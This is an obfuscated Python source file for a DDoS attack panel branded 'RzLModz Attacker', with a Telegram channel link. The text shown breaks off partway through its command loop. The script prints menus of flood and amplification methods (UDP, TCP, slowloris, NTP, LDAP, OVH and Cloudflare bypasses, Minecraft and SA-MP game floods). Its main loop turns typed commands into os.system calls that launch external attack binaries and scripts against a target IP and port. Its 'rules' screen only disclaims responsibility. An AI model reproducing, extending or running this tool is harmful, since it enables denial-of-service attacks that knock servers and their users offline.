lllllllllllllll, llllllllllllllI, lllllllllllllIl, lllllllllllllII, llllllllllllIll, llllllllllllIlI = bytes, print, open, input, IndexError, len

import socket as lIlIllIlIIIIIl
import os as IllIIIIlIlllII
import requests as lIlIlIllIlIllI
import random as IlIIlIIIlIlIII
import getpass as llIIIIlllIlllI
import time as lllIlIlllIIllI
import sys as llIIIllIIlIIlI

def lIlllIllIllIIIIlIl():
    IllIIIIlIlllII.system('cls' if IllIIIIlIlllII.name == 'nt' else 'clear')
lIlllIIIlIIlllIIII = lllllllllllllIl('proxies.txt').readlines()
llllIIllIlllllIlll = llllllllllllIlI(lIlllIIIlIIlllIIII)

def IllllIIIIllIllIlIl():
    lIlllIllIllIIIIlIl()
    llllllllllllllI(f'\n     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⡤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⢀⣤⡶⠁⣠⣴⣾⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⠀⠀⡂\n⠀⠀⠀⠀⢀⣴⣿⣿⣴⣿⠿⠋⣁⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀\n⠀⠀⠀⣰⣿⣿⣿⣿⣿⣷⣾⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣄⡀⠄⠀⠀⠀⠀⠀⠀\n⠀⣠⣾⣿⡿⠟⠋⠉⠀⣀⣀⣀⣨⣭⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⣤⣤⣤⣴⠂\n⠈⠉⠁⠀⠀⣀⣴⣾⣿⣿⡿⠟⠛⠉⠉⠉⠉⡋⠛⠻⠿⠿⠿⠿⠿⠿⠟⠋⠁⠀\n⠀⠀⠀⢀⣴⣿⣿⣿⡿⠁⠀⢀⣀⣤⣤⣤⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⣾⣿⣿⣿⡿⠁⢀⣴⣿⠋⠉⠉⠉⠉⠛⣿⣿⣶⣤⣤⣤⣤⣶⠖⠀⠀⡀\n⠀⠀⢸⣿⣿⣿⣿⡇⢀⣿⣿⣇⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⡿⠃⠀⠠⠀⠀\n⠀⠀⠸⣿⣿⣿⣿⡇⠈⢿⣿⣿⠇⠀⠀⠀⠀⠀⢠⣿⣿⣿⠟⠋⠀⠀⡀⠀⠀⠀\n⠀⠀⠀⢿⣿⣿⣿⣷⡀⠀⠉⠉⠀⠀⠀⠀⠀⢀⣾⣿⣿⡏⠀⠀⠀⠄⠀⠀⠀⠀\n⠀⠀⠀⠀⠙⢿⣿⣿⣷⣄⡀⠀⠀⠀⠀⣀⣴⣿⣿⣿⣋⣠⡤⠄⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠈⠙⠛⠛⠿⠿⠿⠿⠿⠿⠟⠛⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀\n\n\n\n\n\n\n\n    ')

def IIlIlIlIlIllllllll():
    llllllllllllllI('         \x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mRzL \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to RzLModz DDos! \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner: RzLModz \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mUpdate v1.1')
    llllllllllllllI('')

def lllIllllIlllllllll():
    lIlllIllIllIIIIlIl()
    IIlIlIlIlIllllllll()
    llllllllllllllI(f'\n                                \x1b[38;2;0;212;14m╔═══════════════╗\n                                \x1b[38;2;0;212;14m║    \x1b[38;2;0;255;255mSpecial    \x1b[38;2;0;212;14m║\n                \x1b[38;2;0;212;14m╔═══════════════╩══════╦════════╩═══════════════╗\n                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mstress              \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║\n                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║  \n                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║\n                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║\n                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║\n                \x1b[38;2;0;212;14m╚══════════════════════╩════════════════════════╝\n')

def lIIlllIIIlllIIIllI():
    lIlllIllIllIIIIlIl()
    IIlIlIlIlIllllllll()
    llllllllllllllI(f'\n                              \x1b[38;2;0;212;14m╔═══════════════╗\n                              \x1b[38;2;0;212;14m║    \x1b[38;2;0;255;255mLayer 7    \x1b[38;2;0;212;14m║\n               \x1b[38;2;0;212;14m╔══════════════╩════════╦══════╩══════════════╗\n               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp-raw            \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mcrash             \x1b[38;2;0;212;14m║\n               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp-socket         \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttpflood         \x1b[38;2;0;212;14m║\n               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp-storm          \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mcf-socket         \x1b[38;2;0;212;14m║\n               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp-rand           \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mcf-pro            \x1b[38;2;0;212;14m║\n               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mcf-bypass           \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhyper             \x1b[38;2;0;212;14m║\n               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255muambypass         \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mslow              \x1b[38;2;0;212;14m║\n               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttpget             \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttps-spoof      \x1b[38;2;0;212;14m║\n               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m<empty>            \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp-requests        \x1b[38;2;0;212;14m║\n               \x1b[38;2;0;212;14m╚═══════════════════════╩═════════════════════╝\n')

def llIlIIIllIlIlIIllI():
    lIlllIllIllIIIIlIl()
    IIlIlIlIlIllllllll()
    llllllllllllllI(f'\n                              \x1b[38;2;0;212;14m╔═══════════════╗\n                              \x1b[38;2;0;212;14m║    \x1b[38;2;0;255;255mLayer 4    \x1b[38;2;0;212;14m║\n               \x1b[38;2;0;212;14m╔══════════════╩════════╦══════╩══════════════╗\n               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mudp                 \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mtcp               \x1b[38;2;0;212;14m║\n               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mnfo-killer            \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mstd               \x1b[38;2;0;212;14m║\n               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mudpbypass          \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mdestroy           \x1b[38;2;0;212;14m║\n               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhome                \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mgod               \x1b[38;2;0;212;14m║\n               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mslowloris            \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mflux                \x1b[38;2;0;212;14m║\n               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mstdv                 \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m<empty>           \x1b[38;2;0;212;14m║\n               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255movh-raw             \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255movh-beam          \x1b[38;2;0;212;14m║\n               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255moverflow            \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mbrutal             \x1b[38;2;0;212;14m║                          \n               \x1b[38;2;0;212;14m╚═══════════════════════╩═════════════════════╝\n')

def lIIIIIllIIlllIllll():
    lIlllIllIllIIIIlIl()
    IIlIlIlIlIllllllll()
    llllllllllllllI(f"\n                              \x1b[38;2;0;212;14m╔═══════════════╗\n                              \x1b[38;2;0;212;14m║\x1b[38;2;0;255;255m AMP's \x1b[38;2;0;212;14m/ \x1b[38;2;0;255;255mGames \x1b[38;2;0;212;14m║\n               \x1b[38;2;0;212;14m╔══════════════╩════════╦══════╩══════════════╗\n               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255movh-amp             \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255movh-amp           \x1b[38;2;0;212;14m║\n               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mminecraft           \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mstd               \x1b[38;2;0;212;14m║\n               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255msamp                \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mldap              \x1b[38;2;0;212;14m║\n               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m<empty>           \x1b[38;2;0;212;14m║\n               \x1b[38;2;0;212;14m╚═══════════════════════╩═════════════════════╝\n")

def IlIlIIIIIlIllIlIII():
    lIlllIllIllIIIIlIl()
    IIlIlIlIlIllllllll()
    llllllllllllllI(f'\n                                \x1b[38;2;0;212;14m╔═══════════════╗\n                                \x1b[38;2;0;212;14m║     \x1b[38;2;0;255;255mRules     \x1b[38;2;0;212;14m║\n                \x1b[38;2;0;212;14m╔═══════════════╩═══════════════╩═══════════════╗\n                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m2. The owner does not recommend attacking the government, if you do so you must be willing to take responsibility and accept all risks   \x1b[38;2;0;212;14m║\n                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m4. Only attack for testing servers                                                                                                                    \x1b[38;2;0;212;14m║\n                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m7. The creator is not responsible if this tool is used by the wrong person for unlawful activities                                                \x1b[38;2;0;212;14m║\n                \x1b[38;2;0;212;14m╚═══════════════════════════════════════════════╝\n')

def IIllllIllIllIllIll():
    llIIIllIIlIIlI.stdout.write(f'         \x1b]2;Overload Server --> Online Users: [1] | Stresser Panel Vip\x07')
    lIlllIllIllIIIIlIl()
    llllllllllllllI('\x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mRzL \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to RzLModz Attacker! \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner: RzLModz \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mUpdate v1.1')
    llllllllllllllI('')
    llllllllllllllI("  \n                                         _.oo.\n                 _.u[[/;:,.         .odMMMMMM'\n              .o888UU[[[/;:-.  .o@P^    MMM^\n             oN88888UU[[[/;::-.        dP^\n            dNMMNN888UU[[[/;:--.   .o@P^\n           ,MMMMMMN888UU[[/;::-. o@^\n           NNMMMNN888UU[[[/~.o@P^\n           888888888UU[[[/o@^-..\n          oI8888UU[[[/o@P^:--..\n       .@^  YUU[[[/o@^;::---..\n     oMP     ^/o@P^;:::---..\n  .dMMM    .o@^ ^;::---...\n dMMMMMMM@^`       `^^^^\nYMMMUP^\n              Simple C2 Overload 2024\n                   V : 1.1\n              MADE BY : RzLModz 🚀                     \n\x1b[38;2;0;212;14m╔═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╗\n\x1b[38;2;0;212;14m║          \x1b[38;2;239;239;239mWelcome to RzLModz Attacker DDoS Panel        \x1b[38;2;0;49;147m║\n\x1b[38;2;0;212;14m║ \x1b[38;2;0;49;147m- - - - - - \x1b[38;2;239;239;239m DDoS Panel 2024\x1b[38;2;0;212;14m- - - - - - -\x1b[38;2;0;49;147m║\n\x1b[38;2;0;212;14m╚═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╝\n\x1b[38;2;0;212;14m╔═══════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════╗\n\x1b[38;2;0;212;14m║ \x1b[38;2;239;239;239mhttps://t.me/POWERPROOFOVERLOAD \x1b[38;2;0;49;147m║\n\x1b[38;2;0;212;14m╚═══════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════╝\n\x1b[38;2;0;212;14m╔═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╗\n\x1b[38;2;0;212;14m║\x1b[38;2;239;239;239mLAYER7  ► SHOW LAYER7 METHODS\n                                                             LAYER4  ► SHOW LAYER4 METHODS\n                                                             AMP     ► SHOW AMP METHODS\n                                                             SPECIAL ► SHOW SPECIAL METHODS\n                                                             RULES   ► RULES PANEL\n                                                             CLEAR   ► CLEAR TERMINAL \x1b[38;2;0;49;147m║\n\x1b[38;2;0;212;14m╚═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╝\n")

def lllIlIIllIlIlllllI():
    IIllllIllIllIllIll()
    while True:
        IllIlIIlIlIlIlIlIl = lllllllllllllII('\x1b[38;2;0;212;14m╔══[root\x1b[38;2;0;186;45m@Ko\x1b[38;2;0;150;88mmin\x1b[38;2;0;113;133mfo\x1b[38;2;0;49;147m]\n\x1b[38;2;0;212;14m╚\x1b[38;2;0;186;45m═\x1b[38;2;0;150;88m═\x1b[38;2;0;113;133m═\x1b[38;2;0;83;168m═\x1b[38;2;0;49;147m➤ \x1b[38;2;239;239;239m')
        if IllIlIIlIlIlIlIlIl == 'layer7' or IllIlIIlIlIlIlIlIl == 'LAYER7' or IllIlIIlIlIlIlIlIl == 'L7' or (IllIlIIlIlIlIlIlIl == 'l7'):
            lIIlllIIIlllIIIllI()
        elif IllIlIIlIlIlIlIlIl == 'layer4' or IllIlIIlIlIlIlIlIl == 'LAYER4' or IllIlIIlIlIlIlIlIl == 'L4' or (IllIlIIlIlIlIlIlIl == 'l4'):
            llIlIIIllIlIlIIllI()
        elif IllIlIIlIlIlIlIlIl == 'amp' or IllIlIIlIlIlIlIlIl == 'AMP' or IllIlIIlIlIlIlIlIl == 'amp/game' or (IllIlIIlIlIlIlIlIl == 'amps/game') or (IllIlIIlIlIlIlIlIl == 'amps/games') or (IllIlIIlIlIlIlIlIl == 'amp/games') or (IllIlIIlIlIlIlIlIl == 'AMP/GAME'):
            lIIIIIllIIlllIllll()
        elif IllIlIIlIlIlIlIlIl == 'special' or IllIlIIlIlIlIlIlIl == 'SPECIAL' or IllIlIIlIlIlIlIlIl == 'specialS' or (IllIlIIlIlIlIlIlIl == 'SPECIALS'):
            lllIllllIlllllllll()
        elif IllIlIIlIlIlIlIlIl == 'rule' or IllIlIIlIlIlIlIlIl == 'RULES' or IllIlIIlIlIlIlIlIl == 'rules' or (IllIlIIlIlIlIlIlIl == 'RULES') or (IllIlIIlIlIlIlIlIl == 'RULE34'):
            IlIlIIIIIlIllIlIII()
        elif 'udpbypass' in IllIlIIlIlIlIlIlIl:
            try:
                IlIIlIIIllIIIlIllI = IllIlIIlIlIlIlIlIl.split()[1]
                IIlIIlllIIllIIIIll = IllIlIIlIlIlIlIlIl.split()[2]
                IllIIIIlIlllII.system(f'./UDPBYPASS {IlIIlIIIllIIIlIllI} {IIlIIlllIIllIIIIll}')
            except llllllllllllIll:
                llllllllllllllI('Usage: udpbypass <ip> <port>')
                llllllllllllllI('Example: udpbypass 1.1.1.1 80')
        elif 'stdv2' in IllIlIIlIlIlIlIlIl:
            try:
                IlIIlIIIllIIIlIllI = IllIlIIlIlIlIlIlIl.split()[1]
                IIlIIlllIIllIIIIll = IllIlIIlIlIlIlIlIl.split()[2]
                IllIIIIlIlllII.system(f'./std {IlIIlIIIllIIIlIllI} {IIlIIlllIIllIIIIll}')
            except llllllllllllIll:
                llllllllllllllI('Usage: stdv2 <ip> <port>')
                llllllllllllllI('Example: stdv2 1.1.1.1 80')
        elif 'flux' in IllIlIIlIlIlIlIlIl:
            try:
                IlIIlIIIllIIIlIllI = IllIlIIlIlIlIlIlIl.split()[1]
                IIlIIlllIIllIIIIll = IllIlIIlIlIlIlIlIl.split()[2]
                IllllIlIIIlIIIIlll = IllIlIIlIlIlIlIlIl.split()[3]
                IllIIIIlIlllII.system(f'./flux {IlIIlIIIllIIIlIllI} {IIlIIlllIIllIIIIll} {IllllIlIIIlIIIIlll} 0')
            except llllllllllllIll:
                llllllllllllllI('Usage: flux <ip> <port> <threads>')
                llllllllllllllI('Example: flux 1.1.1.1 80 250')
        elif 'slowloris' in IllIlIIlIlIlIlIlIl:
            try:
                IlIIlIIIllIIIlIllI = IllIlIIlIlIlIlIlIl.split()[1]
                IIlIIlllIIllIIIIll = IllIlIIlIlIlIlIlIl.split()[2]
                IllIIIIlIlllII.system(f'./slowloris {IlIIlIIIllIIIlIllI} {IIlIIlllIIllIIIIll}')
            except llllllllllllIll:
                llllllllllllllI('Usage: slowloris <ip> <port>')
                llllllllllllllI('Example: slowloris 1.1.1.1 80')
        elif 'god' in IllIlIIlIlIlIlIlIl:
            try:
                IlIIlIIIllIIIlIllI = IllIlIIlIlIlIlIlIl.split()[1]
                IIlIIlllIIllIIIIll = IllIlIIlIlIlIlIlIl.split()[2]
                IIIlIlllIllllllIII = IllIlIIlIlIlIlIlIl.split()[3]
                IllIIIIlIlllII.system(f'perl god.pl {IlIIlIIIllIIIlIllI} {IIlIIlllIIllIIIIll} 65500 {IIIlIlllIllllllIII}')
            except llllllllllllIll:
                llllllllllllllI('Usage: god <ip> <port> <time>')
                llllllllllllllI('Example: god 1.1.1.1 80 60')
        elif 'destroy' in IllIlIIlIlIlIlIlIl:
            try:
                IlIIlIIIllIIIlIllI = IllIlIIlIlIlIlIlIl.split()[1]
                IIlIIlllIIllIIIIll = IllIlIIlIlIlIlIlIl.split()[2]
                IIIlIlllIllllllIII = IllIlIIlIlIlIlIlIl.split()[3]
                IllIIIIlIlllII.system(f'perl destroy.pl {IlIIlIIIllIIIlIllI} {IIlIIlllIIllIIIIll} 65500 {IIIlIlllIllllllIII}')
            except llllllllllllIll:
                llllllllllllllI('Usage: destroy <ip> <port> <time>')
                llllllllllllllI('Example: destroy 1.1.1.1 80 60')
        elif 'std' in IllIlIIlIlIlIlIlIl:
            try:
                IlIIlIIIllIIIlIllI = IllIlIIlIlIlIlIlIl.split()[1]
                IIlIIlllIIllIIIIll = IllIlIIlIlIlIlIlIl.split()[2]
                IllIIIIlIlllII.system(f'./STD-NOSPOOF {IlIIlIIIllIIIlIllI} {IIlIIlllIIllIIIIll}')
            except llllllllllllIll:
                llllllllllllllI('Usage: std <ip> <port>')
                llllllllllllllI('Example: std 1.1.1.1 80')
        elif 'home' in IllIlIIlIlIlIlIlIl:
            try:
                IlIIlIIIllIIIlIllI = IllIlIIlIlIlIlIlIl.split()[1]
                IIlIIlllIIllIIIIll = IllIlIIlIlIlIlIlIl.split()[2]
                IlllIIIllIlIllIlll = IllIlIIlIlIlIlIlIl.split()[3]
                IIIlIlllIllllllIII = IllIlIIlIlIlIlIlIl.split()[4]
                IllIIIIlIlllII.system(f'perl home.pl {IlIIlIIIllIIIlIllI} {IIlIIlllIIllIIIIll} {IlllIIIllIlIllIlll} {IIIlIlllIllllllIII}')
            except llllllllllllIll:
                llllllllllllllI('Usage: home <ip> <port> <packet_size> <time>')
                llllllllllllllI('Example: home 1.1.1.1 80 65500 60')
        elif 'udp' in IllIlIIlIlIlIlIlIl:
            try:
                IlIIlIIIllIIIlIllI = IllIlIIlIlIlIlIlIl.split()[1]
                IIlIIlllIIllIIIIll = IllIlIIlIlIlIlIlIl.split()[2]
                IllIIIIlIlllII.system(f'python2 udp.py {IlIIlIIIllIIIlIllI} {IIlIIlllIIllIIIIll} 0 0')
            except llllllllllllIll:
                llllllllllllllI('Usage: udp <ip> <port>')
                llllllllllllllI('Example: udp 1.1.1.1 80')
        elif 'nfo-killer' in IllIlIIlIlIlIlIlIl:
            try:
                IlIIlIIIllIIIlIllI = IllIlIIlIlIlIlIlIl.split()[1]
                IIlIIlllIIllIIIIll = IllIlIIlIlIlIlIlIl.split()[2]
                lIlIlIlllIlIIlIIll = IllIlIIlIlIlIlIlIl.split()[3]
                IIIlIlllIllllllIII = IllIlIIlIlIlIlIlIl.split()[4]
                IllIIIIlIlllII.system(f'./nfo-killer {IlIIlIIIllIIIlIllI} {IIlIIlllIIllIIIIll} {lIlIlIlllIlIIlIIll} -1 {IIIlIlllIllllllIII}')
            except llllllllllllIll:
                llllllllllllllI('Usage: nfo-killer <ip> <port> <threads> <time>')
                llllllllllllllI('Example: nfo-killer 1.1.1.1 80 850 60')
        elif 'ovh-raw' in IllIlIIlIlIlIlIlIl:
            try:
                lllIIlIIllIllIIIIl = IllIlIIlIlIlIlIlIl.split()[1]
                IlIIlIIIllIIIlIllI = IllIlIIlIlIlIlIlIl.split()[2]
                IIlIIlllIIllIIIIll = IllIlIIlIlIlIlIlIl.split()[3]
                IIIlIlllIllllllIII = IllIlIIlIlIlIlIlIl.split()[4]
                llIllIIlIlllIIIIlI = IllIlIIlIlIlIlIlIl.split()[5]
                IllIIIIlIlllII.system(f'./ovh-raw {lllIIlIIllIllIIIIl} {IlIIlIIIllIIIlIllI} {IIlIIlllIIllIIIIll} {IIIlIlllIllllllIII} {llIllIIlIlllIIIIlI}')
            except llllllllllllIll:
                llllllllllllllI('Usage: ovh-raw METHODS[GET/POST/HEAD] <ip> <port> <time> <connections>')
                llllllllllllllI('Example: ovh-raw GET 1.1.1.1 80 60 8500')
        elif 'tcp' in IllIlIIlIlIlIlIlIl:
            try:
                lllIIlIIllIllIIIIl = IllIlIIlIlIlIlIlIl.split()[1]
                IlIIlIIIllIIIlIllI = IllIlIIlIlIlIlIlIl.split()[2]
                IIlIIlllIIllIIIIll = IllIlIIlIlIlIlIlIl.split()[3]
                IIIlIlllIllllllIII = IllIlIIlIlIlIlIlIl.split()[4]
                llIllIIlIlllIIIIlI = IllIlIIlIlIlIlIlIl.split()[5]
                IllIIIIlIlllII.system(f'./100UP-TCP {lllIIlIIllIllIIIIl} {IlIIlIIIllIIIlIllI} {IIlIIlllIIllIIIIll} {IIIlIlllIllllllIII} {llIllIIlIlllIIIIlI}')
            except llllllllllllIll:
                llllllllllllllI('Usage: tcp METHODS[GET/POST/HEAD] <ip> <port> <time> <connections>')
                llllllllllllllI('Example: tcp GET 1.1.1.1 80 60 8500')
        elif 'ovh-beam' in IllIlIIlIlIlIlIlIl:
            try:
                lllIIlIIllIllIIIIl = IllIlIIlIlIlIlIlIl.split()[1]
                IlIIlIIIllIIIlIllI = IllIlIIlIlIlIlIlIl.split()[2]
                IIlIIlllIIllIIIIll = IllIlIIlIlIlIlIlIl.split()[3]
                IIIlIlllIllllllIII = IllIlIIlIlIlIlIlIl.split()[4]
                IllIIIIlIlllII.system(f'./OVH-BEAM {lllIIlIIllIllIIIIl} {IlIIlIIIllIIIlIllI} {IIlIIlllIIllIIIIll} {IIIlIlllIllllllIII} 1024')
            except llllllllllllIll:
                llllllllllllllI('Usage: ovh-beam <GET/HEAD/POST/PUT> <ip> <port> <time>')
                llllllllllllllI('Example: ovh-beam GET 51.38.92.223 80 60')
        elif 'overflow' in IllIlIIlIlIlIlIlIl:
            try:
                IlIIlIIIllIIIlIllI = IllIlIIlIlIlIlIlIl.split()[1]
                IIlIIlllIIllIIIIll = IllIlIIlIlIlIlIlIl.split()[2]
                IllllIlIIIlIIIIlll = IllIlIIlIlIlIlIlIl.split()[3]
                IllIIIIlIlllII.system(f'./OVERFLOW {IlIIlIIIllIIIlIllI} {IIlIIlllIIllIIIIll} {IllllIlIIIlIIIIlll}')
            except llllllllllllIll:
                llllllllllllllI('Usage: overflow <ip> <port> <threads>')
                llllllllllllllI('Example: overflow 1.1.1.1 80 5000')
        elif 'brutal' in IllIlIIlIlIlIlIlIl:
            try:
                IlIIlIIIllIIIlIllI = IllIlIIlIlIlIlIlIl.split()[1]
                IIlIIlllIIllIIIIll = IllIlIIlIlIlIlIlIl.split()[2]
                lllllllllllllll = IllIlIIlIlIlIlIlIl.split()[3]
                lIIIIllIIIlIIlllll = IllIlIIlIlIlIlIlIl.split()[4]
                lIlIllIIIIlllIlIlI = IllIlIIlIlIlIlIlIl.split()[5]
                IllIIIIlIlllII.system(f'python3 brutal.py {IlIIlIIIllIIIlIllI} {IIlIIlllIIllIIIIll} {lllllllllllllll} {lIIIIllIIIlIIlllll} {lIlIllIIIIlllIlIlI}')
            except llllllllllllIll:
                llllllllllllllI('Example: brutal 1.1.1.1 80 500 500 Y/N')
        elif 'samp' in IllIlIIlIlIlIlIlIl:
            try:
                IlIIlIIIllIIIlIllI = IllIlIIlIlIlIlIlIl.split()[1]
                IIlIIlllIIllIIIIll = IllIlIIlIlIlIlIlIl.split()[2]
                IllIIIIlIlllII.system(f'python2 samp.py {IlIIlIIIllIIIlIllI} {IIlIIlllIIllIIIIll}')
            except llllllllllllIll:
                llllllllllllllI('Usage: samp <ip> <port>')
                llllllllllllllI('Example: samp 1.1.1.1 7777')
        elif 'ldap' in IllIlIIlIlIlIlIlIl:
            try:
                IlIIlIIIllIIIlIllI = IllIlIIlIlIlIlIlIl.split()[1]
                IIlIIlllIIllIIIIll = IllIlIIlIlIlIlIlIl.split()[2]
                IllllIlIIIlIIIIlll = IllIlIIlIlIlIlIlIl.split()[3]
                IIIlIlllIllllllIII = IllIlIIlIlIlIlIlIl.split()[4]
                IllIIIIlIlllII.system(f'./ldap {IlIIlIIIllIIIlIllI} {IIlIIlllIIllIIIIll} {IllllIlIIIlIIIIlll} -1 {IIIlIlllIllllllIII}')
            except llllllllllllIll:
                llllllllllllllI('Usage: ldap <ip> <port> <threads> <time>')
                llllllllllllllI('Example: ldap 1.1.1.1 80 650 60')
        elif 'minecraft' in IllIlIIlIlIlIlIlIl:
            try:
                IlIIlIIIllIIIlIllI = IllIlIIlIlIlIlIlIl.split()[1]
                IIIlIIIIIIIlIIIlIl = IllIlIIlIlIlIlIlIl.split()[2]
                lIlIlIlllIlIIlIIll = IllIlIIlIlIlIlIlIl.split()[3]
                IIIlIlllIllllllIII = IllIlIIlIlIlIlIlIl.split()[4]
                IllIIIIlIlllII.system(f'./MINECRAFT-SLAM {IlIIlIIIllIIIlIllI} {lIlIlIlllIlIIlIIll} {IIIlIlllIllllllIII}')
            except llllllllllllIll:
                llllllllllllllI('Usage: minecraft <ip> <throttle> <threads> <time>')
                llllllllllllllI('Example: minecraft 1.1.1.1 5000 500 60')
        elif 'ovh-amp' in IllIlIIlIlIlIlIlIl:
            try:
                IlIIlIIIllIIIlIllI = IllIlIIlIlIlIlIlIl.split()[1]
                IIlIIlllIIllIIIIll = IllIlIIlIlIlIlIlIl.split()[2]
                IllIIIIlIlllII.system(f'./OVH-AMP {IlIIlIIIllIIIlIllI} {IIlIIlllIIllIIIIll}')
            except llllllllllllIll:
                llllllllllllllI('Usage: ovh-amp <ip> <port>')
                llllllllllllllI('Example: ovh-amp 1.1.1.1 80')
        elif 'ntp' in IllIlIIlIlIlIlIlIl:
            try:
                IlIIlIIIllIIIlIllI = IllIlIIlIlIlIlIlIl.split()[1]
                IIlIIlllIIllIIIIll = IllIlIIlIlIlIlIlIl.split()[2]
                IIIlIIIIIIIlIIIlIl = IllIlIIlIlIlIlIlIl.split()[3]
                IIIlIlllIllllllIII = IllIlIIlIlIlIlIlIl.split()[4]
                IllIIIIlIlllII.system(f'./ntp {IlIIlIIIllIIIlIllI} {IIlIIlllIIllIIIIll} ntp.txt {IIIlIIIIIIIlIIIlIl} {IIIlIlllIllllllIII}')
            except llllllllllllIll:
                llllllllllllllI('Usage: ntp <ip> <port> <throttle> <time>')
                llllllllllllllI('Example: ntp 1.1.1.1 22 250 60')
        elif 'https-spoof' in IllIlIIlIlIlIlIlIl:
            try:
                IlllIlIllIllIIlIIl = IllIlIIlIlIlIlIlIl.split()[1]
                IIIlIlllIllllllIII = IllIlIIlIlIlIlIlIl.split()[2]
                IllllIlIIIlIIIIlll = IllIlIIlIlIlIlIlIl.split()[3]
                IllIIIIlIlllII.system(f'python3 https-spoof.py {IlllIlIllIllIIlIIl} {IIIlIlllIllllllIII} {IllllIlIIIlIIIIlll}')
            except llllllllllllIll:
